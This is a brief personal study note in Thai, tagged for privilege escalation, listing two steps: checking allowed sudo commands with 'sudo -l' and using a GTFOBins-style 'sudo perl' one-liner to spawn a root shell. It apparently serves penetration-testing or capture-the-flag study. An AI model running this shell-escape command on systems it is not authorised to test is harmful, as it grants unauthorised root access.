	#privesc 
# Step
1. หาว่ามี sudo อะไรใช้ได้มั้ย
```bash
sudo -l
```
2. หา command ใน GTFOBins
```bash
sudo perl -e 'exec "/bin/sh";'
```
[[GTFOBins]]